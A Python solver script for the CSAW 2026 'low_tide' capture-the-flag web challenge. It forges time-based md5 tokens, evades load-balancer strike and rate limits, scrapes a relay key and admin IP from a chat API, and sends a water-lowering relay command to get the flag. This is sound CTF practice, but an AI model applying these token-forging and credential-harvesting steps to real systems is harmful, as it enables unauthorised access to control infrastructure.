#!/usr/bin/env python3
"""
Fully-automated solver for web/low_tide (CSAW 2026 Quals).

Based on the challenge's own solve.py / full_solve.py / writeup.md, but
fully automated end to end (no manual input), reading the relay key and
admin IP straight out of the chat log API rather than hardcoding them.

Chain:
  1. Load balancer (/station/checkin) requires an exact User-Agent, then
     assigns a random session to one of 4 backend "stations". Each
     station runs on a wrong, independently-offset clock; auth is
     md5(identity + current_station_epoch) where identity is either the
     session's sid (before a station is known) or the station_id
     (afterward). We learn the station's clock from the "sync_time" the
     server leaks on a rejected probe, then ANCHOR to that epoch (plus
     time.monotonic() elapsed) rather than re-probing before every single
     request -- the load balancer rotates a session off its station
     after 4 *wrong* token attempts in a row (including probes used only
     to read the clock), so minimizing wasted probes is required, not
     just a nice-to-have.
  2. Once accepted, POSTs to /station/checkin/api/v1/<station_id>/<path>
     (no token-guessing cost beyond the one anchor probe) walk a small
     virtual filesystem: station.log -> .logs/err_3005.log ->
     config/relay-bot.js (base64) -> config/relay_chat.js ->
     config/sync.conf, which gives the formula for a second, chat-bridge
     auth token (md5(station_id+mon+dd+yy+HH+MM), minute-granularity).
  3. GET /station/checkin/api/v2/chat?id=N with that Bot token pages
     through a dev chat log that eventually reveals the relay key and
     the admin-relay host, and says only station 4 has the relay route.
  4. If we didn't land on station 4, start fresh sessions until we do
     (assignment is random, 1/4 per attempt).
  5. POST /station/checkin/relay on station 4 with X-Relay-Target (the
     admin host) and X-Relay-Key (from the chat) plus
     cmd=CMD:WATER:LOWER:50 drops the simulated water level from its
     start of 70 straight to the target of 20 in a single relay call,
     which returns the flag.

Usage:
    python3 solve_low_tide.py <load_balancer_base_url>
    e.g. python3 solve_low_tide.py http://localhost:18080

NOTE: the flag for this challenge is CSAW{...} (uppercase prefix), unlike
every other 2026 challenge's lowercase csaw{...} -- this script preserves
whatever case the service itself returns, it does not normalize it.
"""
import sys
import re
import time
import hashlib
from datetime import datetime, timezone

import requests

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:18080")
CHECKIN = BASE + "/station/checkin"
UA = {"User-Agent": "StationSync-Agent/2.1"}


def step(title):
    print("\n" + "=" * 60)
    print(title)
    print("=" * 60)


def checkin_raw(session, data, headers=None, cookies=None):
    h = {**UA, **(headers or {})}
    r = session.post(CHECKIN, headers=h, data=data, cookies=cookies)
    try:
        body = r.json()
    except ValueError:
        body = {}
    return r, body


def sync_epoch_from(body):
    return int(datetime.strptime(body["sync_time"], "%Y-%m-%dT%H:%M:%SZ")
               .replace(tzinfo=timezone.utc).timestamp())


class Anchor:
    """One probe gives us the station's wall-clock epoch at a point in
    time; from then on we predict 'now' with time.monotonic() so every
    later request derives its own fresh, correct token WITHOUT spending
    another probe (each probe is itself a wrong-token attempt and counts
    against the 4-strikes-per-station lap limit)."""

    def __init__(self, epoch):
        self.epoch = epoch
        self.t0 = time.monotonic()

    def now(self):
        return int(self.epoch + (time.monotonic() - self.t0))


def probe(session, cookies=None):
    r, body = checkin_raw(session, {"action": "checkin", "token": "x"}, cookies=cookies)
    if "sync_time" not in body:
        return None
    return Anchor(sync_epoch_from(body))


def token_for(anchor, identity):
    return hashlib.md5(f"{identity}{anchor.now()}".encode()).hexdigest()


def login(max_tries=15):
    """Fresh session, one probe to anchor the clock, one token attempt
    at the predicted epoch. Returns (session, sid, station_id, anchor)."""
    for attempt in range(max_tries):
        s = requests.Session()
        r, body = checkin_raw(s, {"action": "checkin", "token": "x"})
        sid = s.cookies.get("sid")
        if "sync_time" not in body:
            time.sleep(1)
            continue
        anchor = Anchor(sync_epoch_from(body))
        token = token_for(anchor, sid)
        r, body = checkin_raw(s, {"action": "checkin", "token": token}, cookies={"sid": sid})
        if body.get("result") == "accepted":
            return s, sid, body["station_id"], anchor
        time.sleep(1)
    raise RuntimeError("could not log in after retries")


def main():
    step("STAGE 1 - forge a token, get accepted by a station")
    s, sid, station_id, anchor = login()
    print(f"[+] accepted: sid={sid} station_id={station_id}")

    step("STAGE 2 - walk the virtual filesystem to learn the chat auth formula")
    v1 = f"{CHECKIN}/api/v1/{station_id}"

    def v1_get(path, tries=5):
        body = {}
        for attempt in range(tries):
            token = token_for(anchor, station_id)
            r = requests.post(f"{v1}/{path}", headers=UA,
                               data={"action": "checkin", "token": token},
                               cookies={"sid": sid})
            body = r.json()
            if "content" in body or "entries" in body:
                time.sleep(1.1)  # stay under the LB's 5-requests/5s burst limit
                return body
            print(f"    [v1_get retry {attempt}] path={path!r} body={body}")
            if body.get("result") == "throttled":
                time.sleep(body.get("retry_after", 5) + 0.5)
                continue
            # token rejected (clock drift?) - re-anchor once and retry
            if "sync_time" in body:
                anchor.epoch = sync_epoch_from(body)
                anchor.t0 = time.monotonic()
            time.sleep(0.5)
        return body

    print("[*] root listing:", v1_get(""))
    log = v1_get("station.log")["content"]
    print("[*] station.log:\n" + log)
    hidden_path = re.search(r"stale handler dump written to (\S+)", log).group(1)
    print(f"[+] hidden path found: {hidden_path}")
    hidden = v1_get(hidden_path)
    print("[*] hidden file:", hidden)
    relocated = re.search(r"relocated: (\S+)", hidden["content"]).group(1)

    import base64
    bot_js_b64 = v1_get("config/relay-bot.js")["content"]
    print("[*] relay-bot.js (b64):", bot_js_b64, "->", base64.b64decode(bot_js_b64).decode().strip())

    chat_js = v1_get(relocated)["content"]
    print("[*] relay_chat.js:\n" + chat_js)

    sync_conf = v1_get("config/sync.conf")["content"]
    print("[*] sync.conf:\n" + sync_conf)

    step("STAGE 3 - authenticate to the v2 chat API and mine the log")

    def chat_token():
        now = anchor.now()
        dt = datetime.fromtimestamp(now, tz=timezone.utc)
        identity = f"{station_id}{dt.strftime('%b').lower()}{dt.strftime('%d')}{dt.strftime('%y')}{dt.strftime('%H')}{dt.strftime('%M')}"
        return hashlib.md5(identity.encode()).hexdigest()

    admin_ip, relay_key = None, None
    for start_id in range(1, 61, 5):
        ctoken = chat_token()
        r = requests.get(f"{CHECKIN}/api/v2/chat?id={start_id}",
                          headers={**UA, "Authorization": f"Bot {ctoken}"},
                          cookies={"sid": sid})
        body = r.json()
        msgs = body.get("messages", [])
        if not msgs:
            print(f"    id={start_id}: no messages, response was {body}")
        for m in msgs:
            print(f"    [{m['id']}] {m['from']}: {m['text']}")
            ip_m = re.search(r"\b\d{1,3}(?:\.\d{1,3}){3}\b", m["text"])
            key_m = re.search(r"\b[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}\b", m["text"])
            if ip_m:
                admin_ip = ip_m.group(0)
            if key_m:
                relay_key = key_m.group(0)
        time.sleep(1.1)  # stay under the LB's 5-requests/5s burst limit

    if not admin_ip or not relay_key:
        print("[-] did not find admin IP / relay key in chat log")
        sys.exit(1)
    print(f"\n[+] admin_ip={admin_ip} relay_key={relay_key}")

    step("STAGE 4 - get onto station 4 (only one with relay access)")
    tries = 0
    while station_id != "st-04" and tries < 20:
        tries += 1
        trial = requests.Session()
        r, body = checkin_raw(trial, {"action": "checkin", "token": "x"})
        trial_sid = trial.cookies.get("sid")
        if "sync_time" not in body:
            time.sleep(1)
            continue
        trial_anchor = Anchor(sync_epoch_from(body))
        token = token_for(trial_anchor, trial_sid)
        r, body = checkin_raw(trial, {"action": "checkin", "token": token}, cookies={"sid": trial_sid})
        landed = body.get("station_id")
        print(f"    attempt {tries}: landed on {landed}")
        if landed == "st-04":
            s, sid, station_id, anchor = trial, trial_sid, "st-04", trial_anchor
        time.sleep(0.5)

    if station_id != "st-04":
        print("[-] did not land on station-4 in time")
        sys.exit(1)
    print(f"[+] now on station-4, sid={sid}")

    step("STAGE 5 - relay: drop the water level from 70 straight to 20")
    token = token_for(anchor, station_id)
    r = requests.post(
        CHECKIN + "/relay",
        headers={**UA, "X-Relay-Target": admin_ip, "X-Relay-Key": relay_key},
        data={"action": "checkin", "token": token, "cmd": "CMD:WATER:LOWER:50"},
        cookies={"sid": sid},
    )
    print("[+] relay response:", r.json())

    flag = None
    m = re.search(r"CSAW\{[^}]+\}|csaw\{[^}]+\}", str(r.json()))
    if m:
        flag = m.group(0)
    if flag:
        print(f"\n[*] FLAG: {flag}")
    else:
        print("[-] no flag in response")
        sys.exit(1)


if __name__ == "__main__":
    main()
